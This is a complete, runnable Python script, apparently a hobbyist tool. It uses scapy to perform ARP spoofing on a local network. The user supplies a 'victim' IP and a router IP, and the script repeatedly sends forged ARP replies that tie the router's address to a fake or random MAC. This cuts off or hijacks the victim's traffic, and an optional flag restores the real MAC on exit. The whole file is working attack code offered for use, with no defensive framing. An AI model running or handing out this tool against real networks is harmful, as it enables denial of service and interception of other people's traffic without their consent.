#!/usr/bin/env python3
import typer
import scapy.all
import scapy.layers.l2
from typing import Optional
import random
import time
import itertools

app = typer.Typer(add_completion=False)


@app.command()
def entry_point(
    victim_ip: str = typer.Argument(..., help="The ip of the victim device"),
    router_ip: str = typer.Argument(..., help="The ip of the router"),
    delay: float = typer.Option(5.0, help="The delay between packets"),
    mac_addr: Optional[str] = typer.Option(
        "", help="The mac address to send to the victim", show_default="random"
    ),
    restore: bool = typer.Option(
        False, help="Send the real mac address before quitting"
    ),
):
    # I'll leave checking if the ip is valid as an exercise to the reader
    if restore:
        r_hwsrc = send_arp_request(router_ip)
    pkcnt = 0
    try:
        for i in itertools.cycle(r"\|/-"):
            send_arp_response(victim_ip, router_ip, mac_addr)
            pkcnt += 1
            typer.echo(
                "\r"
                + typer.style(i, fg="red")
                + typer.style(" [", fg="yellow", bold=True)
                + typer.style(str(pkcnt), fg="yellow")
                + typer.style("]", fg="yellow", bold=True),
                nl=False,
            )
            time.sleep(delay)
    finally:
        if restore:
            send_arp_response(victim_ip, router_ip, r_hwsrc)


def get_mac_address(unicast: bool = True, universal: bool = True) -> str:
    lb = (not unicast) + (not universal << 1)
    foct = lb + (random.randint(0, 63) << 2)
    octs = [foct] + [random.randrange(255) for _ in range(5)]
    return ":".join(f"{i:X}" for i in octs)


def send_arp_request(pdst: str) -> str:
    return scapy.all.sr1(scapy.layers.l2.ARP(op=1, pdst=pdst), verbose=False).hwsrc


def send_arp_response(dst_ip: str, src_ip: str, hwsrc: Optional[str] = None) -> None:
    if not hwsrc:
        hwsrc = get_mac_address(unicast=False)
    scapy.all.send(
        scapy.layers.l2.ARP(op=2, psrc=src_ip, pdst=dst_ip, hwsrc=hwsrc), verbose=False
    )


if __name__ == "__main__":
    app()
